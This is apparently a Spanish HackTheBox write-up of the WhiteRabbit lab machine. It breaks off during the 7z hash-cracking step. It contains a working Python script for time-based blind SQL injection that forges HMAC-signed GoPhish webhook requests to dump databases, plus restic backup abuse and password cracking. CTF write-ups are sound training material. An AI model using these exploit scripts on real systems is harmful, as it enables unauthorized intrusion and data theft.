---
title: WhiteRabbit - Insane (HTB)
permalink: /WhiteRabbit-HTB-Writeup/
tags:
  - Linux
  - Insane
  - "SQL Injection"
  - GoPhish
  - N8n
  - Restic
  - 7z
  - "Hash Cracking"
  - Reversing
  - Ghidra
  - Sudoers
  - SSH
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: WhiteRabbit - Insane (HTB)
seo_description: Explota SQL injection en un flujo de n8n, abusa del servicio Restic y analiza el comportamiento de una herramienta que genera contraseñas para vencer WhiteRabbit.
excerpt: Explota SQL injection en un flujo de n8n, abusa del servicio Restic y analiza el comportamiento de una herramienta que genera contraseñas para vencer WhiteRabbit.
header:
  overlay_image: /assets/images/headers/whiterabbit-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/whiterabbit-hackthebox.jpg
---
![image-center](/assets/images/posts/whiterabbit-hackthebox.png)
{: .align-center}

**Habilidades:** Subdomain Fuzzing, Directory Fuzzing, Web Enumeration, Time Based SQL Injection - Python Scripting, `Restic` Repository Enumeration, `7z` File Password Cracking, Abusing Sudoers Privileges - `restic`, Reversing - Binary Analysis with `ghidra`, SSH Brute Force, Abusing Sudoers Privileges [Privilege Escalation]
{: .notice--primary}

# Introducción

WhiteRabbit es una máquina Linux de dificultad `Insane` en HackTheBox que requiere cierta enumeración web y explotación de SQL Injection en un flujo de `n8n` para acceso inicial a un contenedor. 

La herramienta `restic` contendrá copias de seguridad de archivos que nos permitirán conectarnos a la máquina e ir moviéndonos lateralmente desde el contenedor hasta la máquina real. Un proceso de Reversing a un binario ejecutable nos permitirá escalar privilegios y comprometer completamente WhiteRabbit.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.63                                                                                                           
PING 10.10.11.63 (10.10.11.63) 56(84) bytes of data.
64 bytes from 10.10.11.63: icmp_seq=1 ttl=63 time=199 ms

--- 10.10.11.63 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 198.887/198.887/198.887/0.000 ms
~~~


## Nmap Scanning 

Realizaremos un escaneo que identifique puertos abiertos en la máquina víctima. Primeramente utilizaremos el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.63 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-29 16:42 EDT
Nmap scan report for 10.10.11.63
Host is up (0.30s latency).
Not shown: 60832 closed tcp ports (reset), 4700 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 19.27 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo con el propósito de identificar la versión y los servicios que se ejecutan en los puertos que hemos descubierto

~~~ bash
nmap -p 22,80,2222 -sVC 10.10.11.63 -oN services                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-29 16:44 EDT
Nmap scan report for 10.10.11.63
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-title: Did not follow redirect to http://whiterabbit.htb
|_http-server-header: Caddy
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.26 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Enumeration

El puerto `80` se encuentra abierto, sabemos que usa el software `Caddy` como servidor HTTP. Si realizamos un escaneo de las tecnologías web, podremos verificarlo también

~~~ bash
whatweb http://whiterabbit.htb                                                                   
http://whiterabbit.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.10.11.63], Script, Title[White Rabbit - Pentesting Services]
~~~

Al visitar la web desde el navegador, veremos lo siguiente. Al parecer el equipo `White Rabbit` ofrece servicios de `Pentesting`

![image-center](/assets/images/posts/whiterabbit-1-hackthebox.png)
{: .align-center}


## Subdomain Fuzzing

Intentaremos descubrir sub-dominios bajo `whiterabbit.htb` empleando un diccionario de rutas posibles

~~~ bash
gobuster vhost -u http://whiterabbit.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 --append-domain 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://whiterabbit.htb/
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]
~~~

Hemos encontrado el subdominio `status.whiterabbit.htb`, lo agregaremos a nuestro archivo `/etc/hosts`

~~~ bash
10.10.11.63 whiterabbit.htb status.whiterabbit.htb
~~~

### `Uptime Kuma`

Si visitamos la web veremos que se trata del servicio `Uptime Kuma`. Nos redirige a una ruta `dashboard`

> `Uptime Kuma` es una herramienta de monitoreo de código abierto, autoalojada y fácil de usar, diseñada para rastrear el **estado de sitios web**, aplicaciones o servicios de red.
{: .notice--info}

![image-center](/assets/images/posts/whiterabbit-2-hackthebox.png)
{: .align-center}


## Fuzzing

Intentaremos enumerar rutas posibles bajo `/status`, de forma que podamos eludir este panel de autenticación y averiguar algo dentro de este servicio

~~~ bash
gobuster dir -u http://status.whiterabbit.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   200
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/screenshots          (Status: 301) [Size: 189] [--> /screenshots/]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/upload               (Status: 301) [Size: 179] [--> /upload/]
/status               (Status: 404) [Size: 2444]
/metrics              (Status: 401) [Size: 0]
~~~

Podemos realizar `fuzzing` a las rutas que vayamos encontrando, encontramos la ruta `/temp` bajo la ruta `/status`

~~~ bash
gobuster dir -u http://status.whiterabbit.htb/status -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb/status
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/temp                 (Status: 200) [Size: 3359]
~~~

Si visitamos `http://status.whiterabbit.htb/status/temp`, veremos lo siguiente. Una web donde podemos ver el estado de algunos sistemas

![image-center](/assets/images/posts/whiterabbit-3-hackthebox.png)
{: .align-center}


## Subdomains Analysis

Vemos cuatro servicios activos, algunos corresponden a nuevos subdominios, los agregaremos a nuestro archivo `/etc/hosts` para poder aplicar resoluciones DNS correctamente

~~~ bash
10.10.11.63 whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb
~~~
 
### `Gophish`

Comenzaremos enumerando cada uno de estos subdominios, empezando por `ddb09a8558c9.whiterabbit.htb`, el cual corresponde a la plataforma `GoPhish`.

> `GoPhish` es un **framework de phishing** de código abierto diseñado para que los profesionales de seguridad y los equipos de pruebas de penetración puedan realizar simulaciones de ataques de phishing en entornos controlados.
{: .notice--info}

![image-center](/assets/images/posts/whiterabbit-4-hackthebox.png)
{: .align-center}

En cuanto a versiones e intentos de inyección, poco nos queda por hacer más que encontrar una relación con los otros subdominios

### `Wiki.js`

Visitaremos el sub-dominio `a668910b5514e.whiterabbit.htb`, nos encontraremos con la siguiente web, la cual muestra al servicio `Wiki.js`.

> `Wiki.js` es una plataforma wiki potente, moderna y de código abierto construida con JavaScript y Node.js, que permite a equipos y usuarios **crear, organizar y colaborar en documentos** de manera eficaz.
{: .notice--info}

![image-center](/assets/images/posts/whiterabbit-5-hackthebox.png)
{: .align-center}

Si hacemos clic en el botón `Browse`, se despliega un menú, aparece artículo `GoPhish Webhooks`

![image-center](/assets/images/posts/whiterabbit-6-hackthebox.png)
{: .align-center}

Veremos la documentación acerca de la automatización de un `webhook` de `GoPhish` en `n8n`.

> `N8n` es una plataforma de **automatización** de flujos de trabajo no-code de código abierto que permite conectar aplicaciones, servicios y sistemas para automatizar tareas repetitivas y procesos de negocio sin necesidad de escribir código.
{: .notice--info}

![image-center](/assets/images/posts/whiterabbit-7-hackthebox.png)
{: .align-center}

### `n8n` - `GoPhish` Webhook

En esta publicación se detalla el proceso de automatización con un flujo de `n8n`, se capturan eventos de `phishing` en la plataforma `GoPhish`, la cual vimos anteriormente.

- El proceso comienza con un nodo `webhook`, el cual fue configurado para recibir solicitudes POST de `GoPhish`. Cada solicitud contiene datos detallados del evento (ID de campaña, correo electrónico del destinatario y tipo de acción).

- **El flujo incluye un paso para comprobar y verificar la cabecera `x-gophish-signature`**. Esta firma se calcula utilizando una clave secreta de `GoPhish`.

- Se valida la existencia del usuario que ha generado el evento en una base de datos `mysql`, actualizando los datos para esa víctima.

> En cada solicitud enviada a un `webhook` de [`GoPhish`](https://docs.getgophish.com/user-guide/documentation/webhooks#validating-signatures), el contenido puede ser opcionalmente firmado utilizando un valor secreto. Esta firma se calcula sobre todo el contenido del JSON de la solicitud utilizando el algoritmo `HMAC-SHA256`.
{: .notice--warning}

Más abajo nos muestran un ejemplo de solicitud que se tramita hacia el webhook configurado en `n8n`. Se menciona que existe un archivo `gophish_to_phishing_score_database.json`, lo descargaremos para analizar su contenido

![image-center](/assets/images/posts/whiterabbit-8-hackthebox.png)
{: .align-center}

Además vemos un nuevo subdominio `28efa8f7df.whiterabbit.htb`, lo agregaremos a nuestro archivo `/etc/hosts` para poder tramitar peticiones hacia él.

~~~ bash
10.10.11.63 whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb 28efa8f7df.whiterabbit.htb
~~~

Cuando tengamos el subdominio agregado al archivo `/etc/hosts`, podremos copiar el enlace del JSON y descargarlo rápidamente utilizando `wget`

~~~ bash
wget http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json
~~~

Al visitar el nuevo subdominio en el navegador, veremos la web para iniciar sesión dentro de `n8n`

![image-center](/assets/images/posts/whiterabbit-9-hackthebox.png)
{: .align-center}


## `N8N` Workflow Analysis - `GoPhish` Webhook Signature

Inspeccionando el contenido del archivo JSON descargado, vemos un nodo de `n8n` encargado de extraer el valor de la cabecera [`x-gophish-signature`](https://docs.getgophish.com/user-guide/documentation/webhooks#validating-signatures).

~~~ js
...
...
...
"parameters": {
        "jsCode": "const signatureHeader = $json.headers[\"x-gophish-signature\"];\nconst signature = signatureHeader.split('=')[1];\nreturn { json: { signature: signature, body: $json.body } };"
      },
      "id": "49aff93b-5d21-490d-a2af-95611d8f83d1",
      "name": "Extract signature",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        660,
        340
      ]
    },
...
... 
...
~~~

En la sección de parámetros veremos el valor `secret`, el cual es utilizado para construir las firmas `HMAC-SHA-256` según lo que vimos anteriormente.

> HMAC es un mecanismo de autenticación que **utiliza una función hash junto con una clave secreta** para generar un código de autenticación que se añade al mensaje transmitido.
{: .notice--info}

 El cálculo entre `secret` y el contenido del JSON que se envía al `webhook`, resulta en la firma `HMAC`, la cual se envía en la cabecera `x-gophish-signature`.

> Esta firma garantiza la integridad de los datos que viajan en las solicitudes que se envían al servidor, por lo que si se modifica el contenido, la firma ya no será válida
{: .notice--warning}

~~~ json
{
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    },
...
...
...
~~~

Al enviar una solicitud POST tal como se muestra en la publicación, comprobaremos que el valor de la firma está estrictamente relacionado con el contenido de la solicitud
 
![image-center](/assets/images/posts/whiterabbit-10-hackthebox.png)
{: .align-center}

Si modificamos parte del contenido, el servidor ya no procesará la firma como válida

![image-center](/assets/images/posts/whiterabbit-11-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Time Based SQL Injection

El el archivo JSON encontraremos algunas queries `SQL`, a continuación vemos cómo se envía el campo `email` directamente en una consulta a la base de datos

~~~ json
{
      "parameters": {
        "operation": "executeQuery",
        "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
        "options": {}
      },
      "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
      "name": "Get current phishing score",
      "type": "n8n-nodes-base.mySql",
~~~


### Python Scripting - `Gophish` Signature

En mi caso construí un script en `python` para realizar el proceso de explotación de una forma más manual.

Primeramente debemos entender que antes de enviar cualquier solicitud HTTP, debemos firmar el contenido para poder generar una cabecera `x-gophish-signature` válida, la cual se obtiene generando una firma `HMAC`. 

Desde python podemos generar una firma de la siguiente manera, utilizando las librerías `hmac` y `hashlib` para aplicar cifrado `sha256`

~~~ bash
python3

Python 3.12.8 (main, Jun 23 2025, 02:16:53) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> import hmac
>>> 
>>> secret = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
>>> data = '{"campaign_id":1,"email":"test@ex.com","message":"Clicked Link"}'
>>> sign = hmac.new(secret, data.encode(), hashlib.sha256).hexdigest()
>>> print(sign)
cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
>>> exit()
~~~

El valor de la firma en este caso coincide con el que vemos en la web, porque estamos firmando el mismo contenido de ejemplo

~~~ http
x-gohish-signature: cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
~~~

Para procesar una solicitud hacia la web, podemos emplear una función que firme el contenido, y ese hash resultante, utilizarlo en la cabecera `x-gophish-signature`

~~~ python
import hashlib
import hmac
import requests

secret = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
url = 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d'
burp = { 'http': 'http://localhost:8080'}

def post():
    data = '{"campaign_id":1,"email":"test@test.com","message":"Clicked Link"}'
    signature = sign(data.encode())
    headers = {
        "Content-Type": "application/json",
        "x-gophish-signature": f"sha256={signature}"
    }
    response = requests.post(url, headers=headers, data=data, proxies=burp)
    print(response.content)

# Requirement for Gophish
def sign(data): 
    return hmac.new(secret, data, hashlib.sha256).hexdigest()

if __name__ == "__main__":
    post()
~~~

> Nota cómo hacemos uso de un proxy HTTP para interceptar la solicitud a la hora de enviarla al servidor
{: .notice--danger}

De esta forma, estaríamos generando solicitudes HTTP válidas desde `python`

![image-center](/assets/images/posts/whiterabbit-12-hackthebox.png)
{: .align-center}

### Detection

Haciendo algunas pruebas manuales, veremos una salida inusual enviando la solicitud de la siguiente manera modificando el campo `email` (el cual se utiliza en la query `SQL`).

El siguiente enlace a [`CyberChef`](https://gchq.github.io/CyberChef/#recipe=HMAC(%7B'option':'UTF8','string':'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'%7D,'SHA256')&input=eyJjYW1wYWlnbl9pZCI6MSwiZW1haWwiOiJ0ZXN0XCIiLCJtZXNzYWdlIjoiQ2xpY2tlZCBMaW5rIn0&oeol=CR) puede construir una firma válida rápidamente para el payload que intenté en este caso

![image-center](/assets/images/posts/whiterabbit-13-hackthebox.png)
{: .align-center}

En el ejemplo anterior cerramos el dato de entrada de la  `query` original con una comilla doble (`"`), debido a que así se tramitaba en el JSON 

~~~ json
// Payload
{"campaign_id":1,"email":"test\"","message":"Clicked Link"}

// Query
SELECT * FROM victims where email = "test"" LIMIT 1
~~~

De esta forma, la query queda incompleta, faltando otra comilla doble para cerrar la `query`, y esto es lo que genera el error de sintaxis de SQL.

Si ahora inyectamos código SQL para generar algo verdadero (como `1=1`), comprobaremos que podemos manipular la `queery`

> Cada vez que cambiamos el valor del contenido en la solicitud HTTP, debemos volver a generar una firma, puedes hacerlo rápidamente a través de [`Cyberchef`](https://gchq.github.io/CyberChef/#recipe=HMAC(%7B'option':'UTF8','string':'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'%7D,'SHA256')&input=eyJjYW1wYWlnbl9pZCI6MSwiZW1haWwiOiJ0ZXN0XCIgQU5EIDE9MS0tIC0iLCJtZXNzYWdlIjoiQ2xpY2tlZCBMaW5rIn0&oeol=CR).
{: .notice--danger}

![image-center](/assets/images/posts/whiterabbit-14-hackthebox.png)
{: .align-center}

Hasta ahora tenemos una inyección SQL, pero no vemos ninguna salida más que un mensaje de respuesta.

### Payload

Podemos intentar utilizar una query basada en tiempo para que el servidor espere unos segundos y así verificar lo que estamos validando, ya que **si forzamos un valor que retorne falso o un error, no veremos ningún cambio en la respuesta.**

Probando con diferentes sentencias SQL y con recursos externos como [`sql-injection-payload-list`](https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-time-based-sql-injection-payloads), una opción a utilizar es la siguiente

~~~ json
// Query
" AND (SELECT * FROM (SELECT IF((SUBSTRING('test',1,1)='t'),SLEEP(5),SLEEP(0)))Temptable)-- 

// Payload
{"campaign_id":1,"email":"test@ex.com\" AND (SELECT * FROM (SELECT IF((SUBSTRING('test',1,1)='t'),SLEEP(5),SLEEP(0)))Temptable)-- ","message":"Clicked Link"}
~~~

La consulta anterior hace uso de la función `SELECT IF()` para evaluar una condición

- Cuando se obtiene un valor verdadero, usamos la función `SLEEP(5)` para esperar `5` segundos antes de la respuesta, de lo contrario, el servidor responde de forma inmediata.
- El uso de `SUBSTRING()` nos permite recorrer una palabra caracter por caracter

### Python Script

En mi caso modifiqué el script de `python` para construir una mini herramienta básica que nos permita explotar el `SQL Injection` más cómodamente, aplicando una serie de "modos" de explotación.

~~~ python
#!/usr/bin/env python3
import requests
import hmac
import hashlib
import sys
import string
import time
import signal
import concurrent.futures
import argparse
from pwn import log

secret = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
url = 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d'
burp = { 'http': 'http://localhost:8080' }
charset = string.printable

delay = 5
max_len = 24

stop_event = False

def handler(sig, frame):
    global stop_event
    log.error("Exiting...")
    stop_event = True

signal.signal(signal.SIGINT, handler)

# Build SQLi Payload
def build_payload(mode, database=None, table=None, row=0, column=None):
    if mode == "databases":
        query = f"SELECT schema_name FROM information_schema.schemata LIMIT {row},1"
    elif mode == "tables":
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {row},1"
    elif mode == "columns":
        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' and table_name='{table}' LIMIT {row},1"
    elif mode == "dump":
        query = f"SELECT {column} FROM {table} LIMIT {row},1"

    log.info("Query: " + query)
    return query

# Time Based SQL Injection
def exploit_sqli(query, position):
    global stop_event
    if stop_event:
        return position, None

    for char in charset:

        payload = f"AND (SELECT * FROM (SELECT IF((HEX(SUBSTRING(({query}),{position},1))=HEX('{char}')),SLEEP({delay}),SLEEP(0)))temptable)-- "
        start_time = time.time()
        data = "{\"campaign_id\":1,\"email\":\"test@ex.com\\\"" + payload + "\",\"message\":\"Clicked Link\"}"
   
        signature = sign(data.encode())
        headers = {
            "Content-Type": "application/json",
            "x-gophish-signature": f"sha256={signature}"
        }

        response = requests.post(url, headers=headers, data=data)
        end_time = time.time()
        time_elapsed = end_time - start_time

        if time_elapsed > delay:
            return position, char

    return position, None

# Requirement for Gophish
def sign(data): 
    return hmac.new(secret, data, hashlib.sha256).hexdigest()


def main(query, threads):
    bar = log.progress("Extracted value")
    result = [" "] * max_len
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_sqli, query, pos): pos for pos in range(1, max_len + 1)}

        for future in concurrent.futures.as_completed(futures):
            pos = futures[future]
            try:
                _, char = future.result()
                if char:
                    result[pos - 1] = char
                    bar.status("".join(result))
            except Exception as e:
                log.error(f"Error in {pos} position: {e}")

        bar.success("".join(result))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--mode", help="Specify a mode for SQLi (Modes available: databases, tables, columns, dump", default="databases", type=str)
    parser.add_argument("-d", "--database", help="Database name")
    parser.add_argument("-t", "--table", help="Table name")
    parser.add_argument("-r", "--row", help="Row position (default 0)", default=0, type=int)
    parser.add_argument("-c", "--column", help="Column name for data extraction", default='*', type=str)
    parser.add_argument("--threads", help="Number of threads to use", default=5, type=int)

    args = parser.parse_args()

    if args.mode != "databases":
        if args.mode == "tables" and args.database:
            query = build_payload(args.mode, database=args.database, row=args.row)
            main(query, args.threads)
        if args.mode == "columns" and args.database and args.table:
            query = build_payload(args.mode, database=args.database, table=args.table, row=args.row)
            main(query, args.threads)
        if args.mode == "dump" and args.table:
            query = build_payload(args.mode, table=args.table, row=args.row, column=args.column)
            main(query, args.threads)
    elif args.mode == "databases" or args.mode == "dbs":
        query = build_payload(args.mode, row=args.row)
        main(query, args.threads)
    else:
        log.error("Please provide an SQLi mode")
~~~

El payload final que estaremos utilizando para una inyección basada en tiempo es el siguiente

~~~ sql
" AND (SELECT * FROM (SELECT IF((HEX(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {row},1),{position},1))=HEX('{char}')),SLEEP({delay}),SLEEP(0)))temptable)-- 
~~~

- Agregamos la función `HEX()` para comprar el valor hexadecimal del caracter que estamos extrayendo, de esta forma evitamos conflictos entre letras minúsculas que podrían ser válidas como mayúsculas. 

### Database

A continuación se muestra cómo extraemos el nombre de las bases de datos (por orden)

~~~ bash
python3 sqli.py -m databases
[*] Query: SELECT schema_name FROM information_schema.schemata LIMIT 0,1
[+] Extracted value: information_schema 
~~~

- Usando el parámetro `-r` o `--row`, puedes filtrar por filas en una tabla, se ven reflejadas en la sentencia `LIMIT {row},1`

Las bases de datos que encontraremos son las siguientes

~~~ bash
information_schema
phishing
temp
~~~

Ahora lo importante, debemos recorrer otras filas para poder ver más bases de datos (siempre que existan). Es por eso que el script permite especificar la fila dentro de `LIMIT`

~~~ bash
python3 sqli.py -m databases --row 2
[*] Query: SELECT schema_name FROM information_schema.schemata LIMIT 2,1
[+] Extracted value: temp
~~~

### Tables

Descubrimos la base de datos `temp`, procederemos a enumerar las tablas de la base de datos `temp`

~~~ bash
python3 sqli.py -m tables -d temp   
[*] Query: SELECT table_name FROM information_schema.tables WHERE table_schema='temp' LIMIT 0,1
[+] Extracted value: command_log 
~~~

- El script contempla la flag `-d` para especificar la base de datos con la que queremos operar

### Columns

Hemos descubierto la tabla `command_log`, continuaremos enumerando las columnas de esta tabla

~~~ bash
python3 sqli.py -m columns -d temp -t command_log 
[*] Query: SELECT column_name FROM information_schema.columns WHERE table_schema='temp' and table_name='command_log' LIMIT 0,1
[+] Extracted value: id  
~~~

- `-t` hace referencia a la tabla

Las columnas que lograremos ver en la tabla `command_log` son las siguientes

~~~ bash
id
command
date
~~~

### Data

Una vez conocemos cómo se estructura la tabla objetivo, nos queda extraer los datos

~~~ bash
python3 sqli.py -m dump --table temp.command_log --column command         
[*] Query: SELECT command FROM temp.command_log LIMIT 0,1
[+] Extracted value: uname -a 
~~~

- Especificamos la tabla con el `Fully Qualified Name`, donde el formato sigue la estructura `ServerName.DatabaseName.SchemaName.TableName` (en este ejemplo usamos solamente `SchemaName.TableName`)

Los datos extraídos de la tabla `command_log` corresponderían a los siguientes, los cuales son comandos que en teoría se ejecutaron en el sistema

~~~ bash
uname -a
restic init --repo rest:http://75951e6ff.whiterabbit.htb
echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
rm -rf .bash_history
#thatwasclose
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
~~~

Vemos el uso de un comando hacia el subdominio  `75951e6ff.whiterabbit.htb`, agregaremos este nombre a nuestro archivo `/etc/hosts` para aplicar la resolución DNS correctamente.

~~~ bash
10.10.11.63 whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb 28efa8f7df.whiterabbit.htb 75951e6ff.whiterabbit.htb
~~~


## `Restic` Repository Enumeration

El comando que usa `restic`, inicia un repositorio en el subdominio `75951e6ff.whiterabbit.htb` utilizando la opción `init`.

> `Restic` es una herramienta de copia de seguridad de código abierto, multi plataforma y basada en línea de comandos, que crea backups rápidos, seguros y eficientes.
{: .notice--info}

Podemos usar la herramienta [`restic`](https://github.com/restic/restic) para enumerar el repositorio, aunque primero necesitaremos guardar la contraseña empleada que vimos en la base de datos.

~~~ bash
echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
~~~

De esta forma, podremos listar las `snapshots` guardadas en el servidor

~~~ bash
restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd snapshots

repository 5b26a938 opened (repository version 2) successfully, password is correct
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
~~~

Podemos listar los archivos contenidos dentro de la `snapshot` con el siguiente comando, utilizando la opción `ls`, pasando el `id`

~~~ bash
restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd ls 272cacd5

repository 5b26a938 opened (repository version 2) successfully, password is correct
snapshot 272cacd5 of [/dev/shm/bob/ssh] filtered by [] at 2025-03-06 17:18:40.024074307 -0700 -0700):
/dev
/dev/shm
/dev/shm/bob
/dev/shm/bob/ssh
/dev/shm/bob/ssh/bob.7z
~~~

Restableceremos la `snapshot` en el directorio actual, debemos especificar el directorio de destino con la flag `--target`

~~~ bash
restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore 272cacd5 --target . 
~~~

Se copiará todo un directorio `dev`, y el archivo `7z` está dentro de `ssh`

~~~ bash
tree dev
dev
└── shm
    └── bob
        └── ssh
            └── bob.7z

4 directories, 1 file
~~~


## `7z` File Password Cracking

Si intentamos inspeccionar el comprimido notaremos que necesita una contraseña, la cual no conocemos todavía

~~~ bash
7z x dev/shm/bob/ssh/bob.7z 

...
...
...
Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : bob
ERROR: Data Error in encrypted file. Wrong password? : bob.pub
ERROR: Data Error in encrypted file. Wrong password? : config
             
Sub items Errors: 3
Archives with Errors: 1
Sub items Errors: 3
~~~

Extraeremos un hash desde el archivo `bob.7z` para poder intentar crackear su contraseña por fuerza bruta con herramientas como `john` o `hashcat`

~~~ bash
7z2john dev/shm/bob/ssh/bob.7z > hash.txt 
~~~

Procederemos a crackear el hash del archivo

~~~ bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt -O --username

...
...
...
